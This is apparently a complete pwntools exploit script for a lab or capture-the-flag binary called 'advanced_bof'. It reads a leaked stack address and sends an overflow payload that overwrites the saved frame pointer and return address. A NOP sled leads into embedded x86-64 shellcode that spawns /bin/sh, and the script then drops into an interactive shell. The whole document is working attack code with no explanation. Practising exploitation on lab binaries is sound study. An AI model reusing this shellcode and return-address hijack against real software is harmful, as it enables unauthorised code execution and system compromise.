from pwn import *

p = process("./advanced_bof")
sc = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

p.recvuntil(b" @ ")
buf_addr = int(p.recvline().strip(), 0x10)
log.info(f"buf_addr @ {buf_addr:#x}")

gdb.attach(p)

payload = b""
payload += b"A" * 0x8  # main SFP
payload += p64(buf_addr + 0x10) # main RET
payload += b"\x90" * 0x20
payload += sc
payload = payload.ljust(0x200, b"\x90")
payload += p64(buf_addr)   # vuln SFP

p.send(payload)

p.interactive()